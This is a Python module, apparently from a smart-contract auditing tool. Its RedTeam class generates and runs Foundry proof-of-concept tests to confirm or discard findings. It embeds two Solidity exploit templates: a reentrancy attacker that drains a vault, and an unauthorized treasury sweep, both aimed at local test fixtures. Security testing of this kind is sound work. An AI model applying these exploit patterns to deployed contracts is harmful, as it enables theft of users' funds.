from pathlib import Path

from sentinel.foundry.runner import FoundryRunner
from sentinel.schemas.artifacts import ExploitArtifact
from sentinel.schemas.state import RuntimeState
from sentinel.schemas.vulnerability import FindingStatus


class RedTeam:
    """Layer 2: Reason and Act by creating a local executable Foundry test."""

    def __init__(self, foundry: FoundryRunner) -> None:
        self.foundry = foundry

    def generate_and_validate(self, state: RuntimeState) -> RuntimeState:
        finding = next((item for item in state.findings if item.id == state.candidate_id), None)
        if finding is None:
            return state
        source_file = finding.file or state.source_files[0]
        test_source = self._fixture_test(finding.id, source_file)
        if test_source is None:
            state.feedback.append("No safe deterministic PoC template is available for this candidate.")
            return state
        test_name = f"Exploit_{finding.id}.t.sol"
        test_path = Path(state.workspace_path or state.project_path) / "test" / test_name
        test_path.write_text(test_source, encoding="utf-8")
        state.exploit_source = test_source
        state.exploit_artifact = ExploitArtifact(
            vulnerability_id=finding.id, test_file=str(test_path), source=test_source,
            rationale="The PoC is restricted to the target Foundry project and testExploit.",
        )
        state.exploit_result = self.foundry.exploit(Path(state.workspace_path or state.project_path))
        state.exploit_artifact.execution = state.exploit_result
        state.exploit_confirmed = state.exploit_result.success
        finding.status = FindingStatus.CONFIRMED if state.exploit_confirmed else FindingStatus.DISCARDED
        state.exploit_artifact.confirmed = state.exploit_confirmed
        return state

    @staticmethod
    def _fixture_test(finding_id: str, source_file: str) -> str | None:
        if finding_id == "heuristic-reentrancy":
            return f'''pragma solidity ^0.8.20;

import "../{source_file}";

interface Vm {{ function deal(address account, uint256 newBalance) external; }}

contract ReentrancyAttacker {{
    VulnerableVault private immutable vault;
    uint256 private entered;
    constructor(VulnerableVault target) {{ vault = target; }}
    function attack() external payable {{ vault.deposit{{value: msg.value}}(); vault.withdraw(); }}
    receive() external payable {{
        if (entered == 0 && address(vault).balance >= 1 ether) {{
            entered = 1;
            vault.withdraw();
        }}
    }}
}}

contract ExploitTest {{
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    VulnerableVault private vault;
    ReentrancyAttacker private attacker;
    function setUp() public {{
        vm.deal(address(this), 2 ether);
        vault = new VulnerableVault();
        vault.deposit{{value: 1 ether}}();
        attacker = new ReentrancyAttacker(vault);
    }}
    function testExploit() public {{
        attacker.attack{{value: 1 ether}}();
        require(address(attacker).balance == 2 ether, "reentrancy did not drain victim funds");
    }}
}}
'''
        if finding_id == "heuristic-access-control":
            return f'''pragma solidity ^0.8.20;

import "../{source_file}";

interface Vm {{ function deal(address account, uint256 newBalance) external; function prank(address sender) external; }}

contract ExploitTest {{
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    VulnerableTreasury private treasury;
    address private constant attacker = address(0xA11CE);
    function setUp() public {{
        vm.deal(address(this), 1 ether);
        treasury = new VulnerableTreasury{{value: 1 ether}}();
    }}
    function testExploit() public {{
        vm.prank(attacker);
        treasury.sweep(payable(attacker));
        require(address(treasury).balance == 0, "unauthorized sweep was blocked");
    }}
}}
'''
        return None
